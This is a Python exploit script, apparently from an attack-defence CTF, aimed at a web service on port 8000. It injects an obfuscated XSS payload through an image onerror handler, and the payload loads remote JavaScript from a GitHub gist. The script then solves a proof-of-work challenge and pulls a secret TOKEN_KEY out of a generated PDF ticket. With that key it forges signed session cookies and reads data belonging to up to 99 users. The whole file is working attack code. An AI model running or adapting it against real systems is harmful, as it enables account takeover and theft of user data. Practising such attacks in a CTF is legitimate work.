import hashlib
import os
import sys
import tempfile
import urllib.parse
from time import sleep

import msgpack
import checklib
import requests
import textract
import re
import subprocess

regex = re.compile(r"TOKEN_KEY=([A-Za-z0-9\+=\\\/]+)")

IP = sys.argv[1]


def mine_answer(challenge):
    for x in range(0, 10000000000000):
        x = str(x).zfill(4)
        if hashlib.sha256((challenge + x).encode()).hexdigest().startswith('00000'):
            return x


def extract_text(file_resp) -> bytes:
    ntf = tempfile.NamedTemporaryFile(delete=False, suffix='.pdf')
    ntf.write(file_resp.content)
    ntf.close()
    data = textract.process(ntf.name, encoding='utf-8')
    os.unlink(ntf.name)
    return data


def leak_key():
    xss_script_url = 'https://gist.githubusercontent.com/jnovikov/7f3d47b45cc8b9696cfe3882cb88f181/raw/4cad1ba6c459fb5c2b86d1b8f15478186c807edc/moim.js'
    email = checklib.rnd_username() + '@cbsctf.live'
    password = checklib.rnd_password()

    s = requests.Session()
    s.post(f'http://{IP}:8000/api/register', json={'email': email, 'password': password},
           headers={'Accept-Encoding': 'application/json'})

    pwn_url = '<script src="{}"></script>'.format(xss_script_url)

    pwn_code = []
    for c in pwn_url:
        x = 'String.fromCharCode({})'.format(ord(c))
        pwn_code.append(x)

    sploit = 'document.write(' + '+'.join(pwn_code) + ')'

    params = {'width': '50%', 'onerror': sploit}
    sync_data = {'capacity': 10, 'title': 'hehe', 'description': 'Totally not an exploit',
                 'image_url': 'http://keklolkek.kek', 'image_params': params}

    resp = s.post(f'http://{IP}:8000/api/sync', json=sync_data)
    data = resp.json()
    sync_id = data['id']
    r = s.get(f'http://{IP}:8000/api/sync/{sync_id}/challenge')
    challenge = r.json().get('challenge')
    resp = s.post('http://{}:8000/api/sync/{}/join'.format(IP, sync_id),
                         json={'nickname': 'asd', 'challenge_answer': mine_answer(challenge)})
    public_id = resp.json().get('public_id')
    for _ in range(20):
        sleep(0.5)
        r = s.get(f'http://{IP}:8000/api/ticket/' + public_id)
        ticket_data = r.json()
        ticket_url = ticket_data.get('ticket_url')
        if ticket_url:
            url = f'http://{IP}:8000{ticket_url}'
            resp = s.get(url)

            env_file_data = extract_text(resp).decode('utf-8', 'ignore')
            matches = regex.findall(env_file_data)
            if len(matches) == 0:
                return None
            return matches[0]
    else:
        print("Failed to leak key. Timeout", flush=True)
        return None


def generate_cookie(user_id, key=''):
    dump = msgpack.dumps({'id': user_id, 'email': 'kek@kek.kek'})
    ntf = tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.txt')
    ntf.write(dump)
    ntf.close()

    hsh = subprocess.check_output(['php', 'hash.php', ntf.name, key])
    os.unlink(ntf.name)

    return urllib.parse.quote(msgpack.dumps([dump, hsh]))


key = leak_key()
if key is None:
    print("Failed to leak key")
    sys.exit(1)

print(key, flush=True)

for u in range(1, 100):
    cookie = generate_cookie(u, key)
    resp = requests.get(f'http://{IP}:8000/api/sync', cookies={'session_token': cookie})
    if resp.status_code != 200:
        continue
    for s in resp.json():
        sync_id = s.get('id')
        resp = requests.get('http://{}:8000/api/sync/{}'.format(IP, sync_id), cookies={'session_token': cookie})
        print(resp.text, flush=True)
